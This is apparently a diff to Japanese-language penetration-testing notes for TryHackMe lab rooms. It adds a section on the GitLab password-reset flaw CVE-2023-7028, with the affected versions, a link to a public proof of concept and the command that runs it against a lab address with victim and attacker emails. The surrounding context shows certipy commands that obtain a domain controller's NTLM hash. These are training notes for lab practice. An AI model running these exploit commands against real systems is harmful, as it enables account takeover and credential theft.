@@ -356,3 +356,17 @@ certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-
 # DC のNTLMハッシュが返る
 certipy auth -pfx lundc.pfx
 ```
+
+## CVE-2023-7028 (GitLab)
+
+https://tryhackme.com/room/gitlabcve20237028
+
+- `16.1~16.1.5`、`16.2~16.2.8`、`16.3~16.3.6`、`16.4~16.4.4`、`16.5~16.5.5`、`16.6~16.6.3`、`16.7~16.7.1`
+- パスワードリセットメールを自分のアドレスに送信させ、任意のユーザーのパスワードをリセットできる。
+
+poc（THM のリンクに修正版のコードがある）  
+https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py
+
+```sh
+python3 attack.py -u http://10.10.207.254:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
+```
